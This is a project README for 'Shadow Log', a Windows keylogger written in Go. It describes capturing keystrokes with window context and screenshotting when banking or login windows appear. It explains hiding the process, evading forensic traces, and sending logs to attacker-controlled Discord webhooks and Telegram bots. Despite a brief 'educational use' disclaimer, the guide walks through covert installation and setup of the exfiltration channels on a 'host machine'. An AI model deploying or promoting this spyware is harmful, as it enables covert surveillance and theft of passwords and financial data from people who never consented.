# Shadow Log: Discrete Activity Analytics

![Go](https://img.shields.io/badge/Language-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Build](https://img.shields.io/badge/Build-Optimized-success?style=for-the-badge)

**Official Website**: [shadowlog.iambgx.in](https://shadowlog.iambgx.in)

Shadow Log is a high-performance, native systems monitoring framework engineered for advanced cybersecurity research and authorized security demonstrations. Built entirely in Go with zero runtime dependencies, it provides an enterprise-grade approach to discrete activity capture, low-resource processing, and dual-channel exfiltration.

---

> [!CAUTION]
> ### Legal and Ethical Warning
> **FOR AUTHORIZED EDUCATIONAL AND RESEARCH USE ONLY.**
> Unauthorized deployment of monitoring tools on systems you do not own or have explicit, documented permission to monitor is illegal and a violation of privacy laws (such as the Computer Fraud and Abuse Act). This software is provided "as-is" for security professionals and students to study low-level system hooks and secure exfiltration techniques. The developer assumes no liability for misuse, data loss, or legal consequences resulting from the use of this tool.

---

## Technical Features

### 🛡️ Advanced Stealth and OPSEC
- **Unified Identity**: The system identifies as **`Shadow Log`** across all telemetry, registry entries, and scheduled tasks for transparent system management.
- **Zero-Dependency Architecture**: Runs natively without requiring external heavy runtimes like Node.js or Python.

### 🌐 Universal Precision Capture
- **International Keyboard Support**: Leverages the Windows `ToUnicode` API to ensure 100% accuracy across all regions, correctly capturing symbols, accents, and shifted characters.
- **Context-Aware Metadata**: Every captured event is automatically correlated with the foreground `ProcessID`, Application Name, and active Window Title.
- **Micro-Memory Footprint**: Implemented Active Window Handle Caching; the system only queries process metadata when the foreground window actually changes, reducing API calls and CPU overhead to negligible levels.

### 🔐 Secure & Formatted Exfiltration
- **Dual-Channel Exfiltration**: Simultaneously sends telemetry to both Telegram and a Discord webhook without requiring intermediary bots.
- **Direct Discord Integration**: Logs bypass local encryption entirely before sending, deploying beautifully formatted and easily readable Markdown reports straight into your Discord server, split precisely to respect Discord's rate limits and character caps.
- **Password-Bound Local Encryption**: Local log backups are strongly encrypted using **AES-256-GCM**. The encryption key is derived from a user-defined password set during initialization, securely locking out unauthorized access.

### 📸 Dynamic Surveillance Capture
- **Context-Triggered Snapshots**: Automatically captures the screen when sensitive keywords (e.g., "login", "password", "bank", "paypal") are detected in the active window title.
- **Interactive Triggers**: Real-time capture on mouse clicks and window focus changes to ensure critical UI states are never missed.
- **RAM-Only Processing**: Encodes screenshots as optimized JPEGs directly in memory (RAM). This eliminates disk I/O traces and ensures a near-zero forensic footprint on the host machine.
- **Active Window Bracketing**: Intelligently crops captures to the foreground window only, reducing data exfiltration size to <200KB per event while maintaining high forensic value.

---

## 🚀 Setup & Deployment Guide

### Option 1: Quick Start (Security Analysts)
If you are an analyst and do not wish to compile from source, download the latest **`ShadowLog_Release.zip`** from the project root.

#### Phase 1: Installation
1. **Extract**: Unzip the archive on the host machine.
2. **Initialize**: Run `ShadowLog.exe` as Administrator to start the setup wizard.
   - *Note: A terminal window may flash a few times while hooks are being registered. This is normal system service behavior.*

#### Phase 2: Configuration
During the initial run, the UI will prompt you to configure the application. You will need to obtain the following credentials:

- **Encryption Password (Required)**: Choose a strong password. This securely locks local forensic backups and is necessary for deciphering telemetry on the local machine later.

- **Discord Webhook (Optional but Recommended)**: 
  Telemetry will be sent directly to your Discord server cleanly formatted. 
  *How to get it:*
  1. Go to your Discord server and create a private channel (e.g., `#shadow-logs`).
  2. Click the gear icon next to the channel to open **Edit Channel**.
  3. Navigate to **Integrations** -> **Webhooks** -> **New Webhook**.
  4. Name your webhook, click **Copy Webhook URL**, and paste this into the Shadow Log setup.

- **Telegram Details (Optional)**: 
  Mirror output to a Telegram channel for mobile access.
  *How to get the Bot Token:*
  1. Message `@BotFather` on Telegram and send `/newbot`.
  2. Follow the prompts to name your bot. `@BotFather` will reply with your HTTP API **Bot Token**.
  3. Send `/setjoingroups` to `@BotFather`, select your bot, and click **Enable** so it can be invited to groups.
  *How to get the Chat ID:*
  1. Create a private Telegram Group and invite your newly created bot to it.
  2. **Crucial Step**: Send the exact command `/test` in the group so the bot registers the chat. (Bots ignore standard messages due to default privacy settings).
  3. Visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` in your browser.
  4. Look for the `"chat":{"id": -xxxxxx}` field in the JSON response. Copy that negative number (including the minus sign)—that is your **Chat ID**.

#### Phase 3: Deployment
1. Click **Test Configuration** to ensure your hooks work.
2. Click **Initialize Monitor**. The service will lock the configuration, hide itself, and run silently as a background process.

---

### Option 2: Build from Source (Developers)

#### Prerequisites
- **Go 1.21+**: Required for compilation.
- **Windows 10/11**: Target environment for native hooks.

#### Compilation
Generate optimized, stripped binaries using the following commands:

```powershell
# Build Core Monitor & Setup
go build -ldflags "-s -w" -o ShadowLog.exe main.go

# Build Forensic Decryptor
go build -ldflags "-s -w" -o Decryptor.exe decryptor/main.go

# Build System Uninstaller
go build -ldflags "-s -w" -o Uninstaller.exe uninstaller/main.go
```

---

## 🔍 Forensic Reconstruction (Viewing Local Logs)

If you need to view the encrypted local backups, Shadow Log includes a robust, web-based local decryption dashboard.

1. **Launch Decryptor**: Run `Decryptor.exe` on the host machine.
2. **Premium Dashboard**: The decryptor spawns a localized web server and automatically opens a premium dashboard in your default browser (`http://localhost:58292`).
3. **Secure Session**: Input your **Encryption Password** on the lock screen to reconstruct and read local encrypted logs dynamically.
4. **Analysis & Export**: 
   - **Live Filtering**: Search through thousands of entries by window title or keystroke content in real-time.
   - **Visual Artifacts**: Identify and correlate specialized "Target Acquisition" events (screenshots) within the log stream.
   - **JSON Export**: Export the entire decoded dataset as a structured JSON file for further analysis in external forensic tools.

---

## 🧹 System Decommission & Clean-up

To completely remove the installation, stop telemetry, and delete traces:
1. Run `Uninstaller.exe`.
2. The uninstaller will natively terminate active monitor processes, unregister the Windows hook persistence routines, drop scheduled tasks, and purge all hidden AES-encrypted telemetry records.

---

<div align="center">

**Devansh Agarwal (BGx)**  
*Cyber Sec Student & Student Developer*  
[Portfolio](https://iambgx.in)

</div>
